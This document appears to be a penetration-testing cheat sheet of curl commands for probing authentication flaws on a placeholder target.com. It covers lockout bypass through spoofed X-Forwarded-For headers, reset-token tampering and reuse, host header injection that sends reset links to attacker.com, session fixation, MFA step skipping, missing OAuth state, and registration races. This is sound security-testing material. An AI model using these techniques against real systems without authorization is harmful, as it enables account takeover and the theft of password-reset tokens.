# Broken Authentication -- Annotated Examples

## Lockout Control Testing

### Baseline test (3 attempts only -- avoid locking real accounts)
```bash
for i in 1 2 3; do
  curl -s -X POST https://target.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"test_account@target.com\",\"password\":\"wrong_pass_${i}\"}" \
    -o /dev/null -w "Attempt $i: %{http_code}\n"
done
```

### IP header bypass (after lockout triggered)
```bash
curl -X POST https://target.com/login \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrong"}'
# Increment X-Forwarded-For per request: 1.2.3.4, 1.2.3.5 etc.
```

### Username variation
```bash
curl -X POST https://target.com/login -d '{"username":"admin ","password":"wrong"}'
curl -X POST https://target.com/login -d '{"username":"Admin","password":"wrong"}'
```

## Password Reset Token Analysis

### Capture and inspect your reset token
```bash
TOKEN="abc123def456"
echo -n "$TOKEN" | wc -c     # check length (should be >= 32 chars)
# Test sequential variant: change last digit
TOKEN_MODIFIED="${TOKEN%?}7"
curl -X POST https://target.com/api/reset-password \
  -d "{\"token\": \"$TOKEN_MODIFIED\", \"password\": \"newpass\"}"
```

### One-time use test
```bash
# Use token once (should succeed)
curl -X POST "https://target.com/reset?token=$YOUR_TOKEN" -d '{"password":"newpass1"}'
# Use same token again (should fail with 400/401)
curl -X POST "https://target.com/reset?token=$YOUR_TOKEN" -d '{"password":"newpass2"}'
# If both 200 -> reset token is multi-use (report this)
```

### Host header injection in reset email
```bash
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"test_account@target.com"}'
# Check received email: does reset link point to attacker.com?
```

## Session Fixation Test

```bash
curl -c /tmp/cookies.txt -b "session=KNOWN_VALUE_12345" \
  -X POST https://target.com/login \
  -d "username=test_user&password=test_pass"

SESSION=$(grep -i session /tmp/cookies.txt | awk '{print $7}')
echo "Session after login: $SESSION"
# If KNOWN_VALUE_12345 -> session fixation confirmed
```

## Session Invalidation After Logout
```bash
# Step 1: Login and capture token
TOKEN=$(curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"pass"}' | jq -r .token)

# Step 2: Verify works
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/profile
# Expected: 200

# Step 3: Logout
curl -X POST https://target.com/api/logout -H "Authorization: Bearer $TOKEN"

# Step 4: Retry with old token
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/profile
# Expected: 401 -- If 200: session not invalidated (report high severity)
```

## MFA Step Skip
```bash
# Step 1: Submit credentials (first factor)
curl -s -X POST https://target.com/login \
  -d '{"username":"test","password":"pass"}' -c /tmp/cookies.txt

# Step 2: Skip MFA -- directly request protected resource
curl -b /tmp/cookies.txt https://target.com/api/dashboard
# Expected: redirect to MFA page
# If 200 with dashboard data -> MFA step skippable (report critical)
```

## OAuth Missing State Parameter
```bash
# Check if state parameter is present in authorization URL
curl -s -I "https://target.com/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://app.com/cb"
# Location should contain: &state=RANDOM_VALUE
# If no state parameter -> CSRF on OAuth flow possible (report high)
```

## Concurrent Session Race (account creation)
```bash
# Send two account creation requests simultaneously with same email
(curl -X POST https://target.com/register -d '{"email":"test@target.com","pass":"p1"}' &
 curl -X POST https://target.com/register -d '{"email":"test@target.com","pass":"p2"}')
# If both return 201 Created -> email uniqueness race condition
```
